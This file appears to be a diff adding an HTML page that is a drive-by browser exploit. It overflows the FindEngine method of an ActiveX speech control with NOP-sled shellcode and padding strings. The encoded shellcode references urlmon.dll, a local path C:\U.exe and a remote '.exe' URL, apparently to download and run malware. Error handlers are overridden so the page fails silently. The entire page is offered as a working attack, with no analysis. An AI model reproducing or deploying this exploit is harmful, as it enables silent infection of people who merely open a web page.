@@ -1,0 +1,74 @@
+<html>
+<object classid="clsid:EEE78591-FE22-11D0-8BEF-0060081841DE" id="DirectSS"></OBJECT>
+<script language="JavaScript">
+<!-- 
+function killErrors() {
+return true;
+}
+window.onerror = killErrors;
+// -->
+</script> 
+<script language="vbscript">
+scode = unescape(""%u54eb%u758b%u8b3c%u3574%u0378%u56f5%u768b%u0320" +
+"%u33f5%u49c9%uad41%udb33%u0f36%u14be%u3828%u74f2" +
+"%uc108%u0dcb%uda03%ueb40%u3bef%u75df%u5ee7%u5e8b" +
+"%u0324%u66dd%u0c8b%u8b4b%u1c5e%udd03%u048b%u038b" +
+"%uc3c5%u7275%u6d6c%u6e6f%u642e%u6c6c%u4300%u5c3a" +
+"%u2e55%u7865%u0065%uc033%u0364%u3040%u0c78%u408b" +
+"%u8b0c%u1c70%u8bad%u0840%u09eb%u408b%u8d34%u7c40" +
+"%u408b%u953c%u8ebf%u0e4e%ue8ec%uff84%uffff%uec83" +
+"%u8304%u242c%uff3c%u95d0%ubf50%u1a36%u702f%u6fe8" +
+"%uffff%u8bff%u2454%u8dfc%uba52%udb33%u5353%ueb52" +
+"%u5324%ud0ff%ubf5d%ufe98%u0e8a%u53e8%uffff%u83ff" +
+"%u04ec%u2c83%u6224%ud0ff%u7ebf%ue2d8%ue873%uff40" +
+"%uffff%uff52%ue8d0%uffd7%uffff%u7468%u7074%u2f3a" +
+"%u772f%u7777%u702e%u6d75%u3161%u3436%u632e%u6d6f" +
+"%u702f%u2f75%u2e31%u7865%u0065") + NOP;
+ eax= unescape("%ff%13")
+ebp= unescape("%ff%13")
+eip= unescape("%01%0a")
+jnk= string(50,unescape("%13"))
+suntzu = string(888,"A") + ebp + eip + eax + jnk
+bufferI   = string(9999999,"X")
+bufferII  = string(9999999,"Y")
+bufferIII = string(9999999,"Z")
+bufferIV  = string(9999999,"O")
+EngineID= string(200000,"b")
+MfgName="default"
+ProductName="default"
+ModeID= string(199544,unescape("%90")) + scode
+ModeName= suntzu
+LanguageID=1
+Dialect="default"
+Speaker="default"
+Style=1
+Gender=1
+Age=1
+Features=1
+Interfaces=1
+EngineFeatures=1
+	RankEngineID=1
+	RankMfgName=1
+	RankProductName=1
+	RankModeID=1
+	RankModeName=1
+	RankLanguage=1
+	RankDialect=1
+	RankSpeaker=1
+	RankStyle=1
+	RankGender=1
+	RankAge=1
+	RankFeatures=1
+	RankInterfaces=1
+	RankEngineFeatures=1
+DirectSS.FindEngine EngineID, MfgName, ProductName, ModeID, ModeName, LanguageID, Dialect, Speaker, Style, Gender, Age, Features, Interfaces, EngineFeatures, RankEngineID, RankMfgName, RankProductName, RankModeID, RankModeName, RankLanguage, RankDialect, RankSpeaker, RankStyle, RankGender, RankAge, RankFeatures, RankInterfaces, RankEngineFeatures
+</script>
+<script language="JavaScript">
+<!-- 
+function killErrors() {
+return true;
+}
+window.onerror = killErrors;
+// -->
+</script> 
+</html>
